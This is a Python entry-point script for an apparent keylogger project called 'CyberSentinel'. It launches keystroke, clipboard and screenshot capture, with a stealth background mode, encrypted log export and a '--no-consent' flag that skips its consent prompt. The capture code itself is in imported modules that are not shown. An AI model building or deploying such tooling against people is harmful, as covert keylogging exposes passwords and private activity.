import sys
import argparse
import signal
import time
from datetime import datetime

from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich import box

from config.settings import (
    APP_NAME,
    APP_VERSION,
    APP_TAGLINE,
    BANNER,
    THEME_PRIMARY,
    THEME_SECONDARY,
    THEME_ACCENT,
    THEME_WARNING,
    THEME_ERROR,
    CLIPBOARD_ENABLED,
    SCREENSHOT_ENABLED,
    EMAIL_ENABLED,
)

from utils.encryption import EncryptionManager
from utils.system_info import SystemProfiler
from utils.consent import ConsentManager

from core.keylogger import KeystrokeEngine
from core.clipboard import ClipboardMonitor
from core.screenshot import ScreenshotCapture

from storage.file_handler import FileHandler
from storage.email_report import EmailReporter

from ui.dashboard import Dashboard

console = Console()

def parse_arguments():
    parser = argparse.ArgumentParser(
        description=f"{APP_NAME} - {APP_TAGLINE}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Modes:\n"
            "  monitor   Real-time monitoring with live dashboard\n"
            "  stealth   Background monitoring without UI\n"
            "  review    Review and browse log files\n"
            "  sysinfo   Display system profile\n"
            "  decrypt   Decrypt and export logs\n"
            "  test      Run self-diagnostic tests\n"
        ),
    )
    parser.add_argument(
        "--mode", "-m",
        choices=["monitor", "stealth", "review", "sysinfo", "decrypt", "test"],
        default=None,
        help="Operating mode",
    )
    parser.add_argument(
        "--no-consent",
        action="store_true",
        help="Skip consent prompt (for automated testing)",
    )
    parser.add_argument(
        "--no-clipboard",
        action="store_true",
        help="Disable clipboard monitoring",
    )
    parser.add_argument(
        "--no-screenshot",
        action="store_true",
        help="Disable screenshot capture",
    )
    return parser.parse_args()

def show_interactive_menu() -> str:
    menu = Text()
    menu.append("\n")
    menu.append("  ┌─────────────────────────────────────────┐\n", style=THEME_PRIMARY)
    menu.append("  │        SELECT OPERATION MODE            │\n", style=f"bold {THEME_PRIMARY}")
    menu.append("  ├─────────────────────────────────────────┤\n", style=THEME_PRIMARY)
    menu.append("  │                                         │\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[1]", style=f"bold {THEME_ACCENT}")
    menu.append("  🖥️  Live Monitor Dashboard       ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[2]", style=f"bold {THEME_ACCENT}")
    menu.append("  🔇 Stealth Mode (Background)     ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[3]", style=f"bold {THEME_ACCENT}")
    menu.append("  📂 Review Log Files              ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[4]", style=f"bold {THEME_ACCENT}")
    menu.append("  🖥️  System Information            ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[5]", style=f"bold {THEME_ACCENT}")
    menu.append("  🔓 Decrypt & Export Logs          ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[6]", style=f"bold {THEME_ACCENT}")
    menu.append("  🧪 Run Self-Tests                ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │  ", style=THEME_PRIMARY)
    menu.append("[0]", style=f"bold {THEME_ERROR}")
    menu.append("  ❌ Exit                           ", style="white")
    menu.append("│\n", style=THEME_PRIMARY)
    menu.append("  │                                         │\n", style=THEME_PRIMARY)
    menu.append("  └─────────────────────────────────────────┘\n", style=THEME_PRIMARY)

    console.print(menu)

    mode_map = {
        "1": "monitor",
        "2": "stealth",
        "3": "review",
        "4": "sysinfo",
        "5": "decrypt",
        "6": "test",
        "0": "exit",
    }

    try:
        choice = Prompt.ask(
            f"  [{THEME_ACCENT}]Enter your choice[/]",
            choices=list(mode_map.keys()),
            default="1",
        )
        return mode_map.get(choice, "monitor")
    except (KeyboardInterrupt, EOFError):
        return "exit"

def run_monitor_mode(args):
    crypto = EncryptionManager()
    keylogger = KeystrokeEngine(encryption_manager=crypto)
    clipboard = ClipboardMonitor(encryption_manager=crypto) if not args.no_clipboard else None
    screenshot = ScreenshotCapture() if not args.no_screenshot else None

    dashboard = Dashboard(
        keylogger=keylogger,
        clipboard=clipboard,
        screenshot=screenshot,
        encryption=crypto,
    )

    _shutdown_done = False

    def shutdown():
        nonlocal _shutdown_done
        if _shutdown_done:
            return
        _shutdown_done = True
        console.print(f"\n\n  [bold {THEME_WARNING}]⚠️  Shutting down gracefully...[/]")
        keylogger.stop()
        if clipboard:
            clipboard.stop()
        if screenshot:
            screenshot.stop()
        dashboard.stop()
        console.print(f"  [bold {THEME_ACCENT}]✅ All modules stopped. Session saved.[/]")
        stats = keylogger.get_stats()
        console.print(f"  📊 Total keystrokes: {stats['total_keystrokes']:,}")
        console.print(f"  📁 Log: {stats['log_file']}\n")

    def signal_handler(sig, frame):
        shutdown()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    console.print(f"\n  [bold {THEME_ACCENT}]🚀 Starting monitoring modules...[/]")
    keylogger.start()
    console.print(f"    [bold {THEME_ACCENT}]✓[/] Keystroke engine started")

    if clipboard:
        clipboard.start()
        console.print(f"    [bold {THEME_ACCENT}]✓[/] Clipboard monitor started")

    if screenshot:
        screenshot.start()
        console.print(f"    [bold {THEME_ACCENT}]✓[/] Screenshot capture started")

    console.print(f"\n  [bold {THEME_PRIMARY}]📊 Launching live dashboard...[/]")
    console.print(f"  [dim]Press Ctrl+C to stop monitoring[/]\n")
    time.sleep(1)

    try:
        dashboard.start_live_monitor()
    except KeyboardInterrupt:
        pass
    finally:
        shutdown()

def run_stealth_mode(args):
    crypto = EncryptionManager()
    keylogger = KeystrokeEngine(encryption_manager=crypto)
    clipboard = ClipboardMonitor(encryption_manager=crypto) if not args.no_clipboard else None
    screenshot = ScreenshotCapture() if not args.no_screenshot else None

    def signal_handler(sig, frame):
        keylogger.stop()
        if clipboard:
            clipboard.stop()
        if screenshot:
            screenshot.stop()
        stats = keylogger.get_stats()
        console.print(
            f"\n  [bold {THEME_ACCENT}]✅ Stealth session ended.[/]"
            f"\n  📊 Total keystrokes: {stats['total_keystrokes']:,}"
            f"\n  📁 Log: {stats['log_file']}\n"
        )
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    keylogger.start()
    if clipboard:
        clipboard.start()
    if screenshot:
        screenshot.start()

    console.print(
        Panel(
            Align.center(
                Text(
                    f"🔇 Stealth monitoring active\n\n"
                    f"Session: {keylogger.session_id}\n"
                    f"Press Ctrl+C to stop",
                    justify="center",
                )
            ),
            title=f"[bold {THEME_PRIMARY}]{APP_NAME}[/]",
            border_style=THEME_PRIMARY,
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

def run_review_mode(args):
    crypto = EncryptionManager()
    file_handler = FileHandler(encryption_manager=crypto)
    dashboard = Dashboard()
    dashboard.show_log_review(file_handler)

def run_sysinfo_mode(args):
    profiler = SystemProfiler()
    dashboard = Dashboard()
    dashboard.show_system_info(profiler)

def run_decrypt_mode(args):
    crypto = EncryptionManager()
    file_handler = FileHandler(encryption_manager=crypto)
    dashboard = Dashboard(encryption=crypto)
    dashboard.show_decrypt_menu(file_handler)

def run_tests(args):
    import unittest

    console.print(
        f"\n  [bold {THEME_PRIMARY}]🧪 Running CyberSentinel Self-Tests...[/]\n"
    )

    loader = unittest.TestLoader()
    suite = loader.discover("tests", pattern="test_*.py")
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    if result.wasSuccessful():
        console.print(
            f"\n  [bold {THEME_ACCENT}]✅ All tests passed![/]\n"
        )
    else:
        console.print(
            f"\n  [bold {THEME_ERROR}]❌ Some tests failed. See output above.[/]\n"
        )

def main():
    args = parse_arguments()

    dashboard = Dashboard()
    dashboard.show_banner()

    mode = args.mode
    if mode is None:
        mode = show_interactive_menu()

    if mode == "exit":
        console.print(f"\n  [bold {THEME_PRIMARY}]👋 Goodbye![/]\n")
        sys.exit(0)

    if mode in ("monitor", "stealth") and not args.no_consent:
        consent = ConsentManager()
        if not consent.request_consent():
            console.print(
                f"\n  [bold {THEME_ERROR}]⛔ Cannot proceed without consent. Exiting.[/]\n"
            )
            sys.exit(1)

    mode_handlers = {
        "monitor": run_monitor_mode,
        "stealth": run_stealth_mode,
        "review": run_review_mode,
        "sysinfo": run_sysinfo_mode,
        "decrypt": run_decrypt_mode,
        "test": run_tests,
    }

    handler = mode_handlers.get(mode)
    if handler:
        handler(args)
    else:
        console.print(f"  [bold {THEME_ERROR}]Unknown mode: {mode}[/]")
        sys.exit(1)

if __name__ == "__main__":
    main()
